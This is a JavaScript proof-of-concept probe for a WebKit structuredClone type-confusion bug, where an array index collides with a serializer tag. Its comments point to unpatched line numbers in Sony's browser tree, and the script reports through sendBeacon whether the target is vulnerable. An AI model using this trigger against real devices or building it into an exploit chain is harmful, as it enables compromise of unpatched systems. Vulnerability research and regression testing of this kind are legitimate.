// Bug 262616 (upstream fix 3a900e192f, Mark Lam 2023-12-14):
// "An Array index in CloneSerializer and CloneDeserializer can be confused for NonIndexPropertiesTag."
//
// NonIndexPropertiesTag is 0xFFFFFFFD, but MAX_ARRAY_INDEX is 0xFFFFFFFE, so 0xFFFFFFFD is a LEGAL array
// index. The serializer terminates an array's indexed section with that same value, so the deserializer
// cannot tell "this array has an element at 4294967293" from "the indexed section ends here". It stops
// reading indices early and parses the remaining bytes as non-index properties: type confusion inside
// structuredClone, reachable with ordinary JavaScript.
//
// Sony's tree still has the pre-fix shape: constants at SerializedScriptValue.cpp:679/681, the bare
// NonIndexPropertiesTag write at :2539, and the `index == NonIndexPropertiesTag` test at :4869.
try {
  var a = [];
  a[4294967293] = 'x';                 // 0xFFFFFFFD - a valid index that collides with the tag
  var c = structuredClone(a);
  // A correct implementation round-trips the element. Confusion shows up here instead.
  if (c[4294967293] !== 'x') {
    try { navigator.sendBeacon('/beacon', 'c012-wrong-value:' + String(c[4294967293]).slice(0, 24)); } catch (e) {}
  } else {
    try { navigator.sendBeacon('/beacon', 'c012-roundtrip-ok'); } catch (e) {}
  }
} catch (e) {
  try { navigator.sendBeacon('/beacon', 'c012-threw:' + (e && e.name)); } catch (e2) {}
}
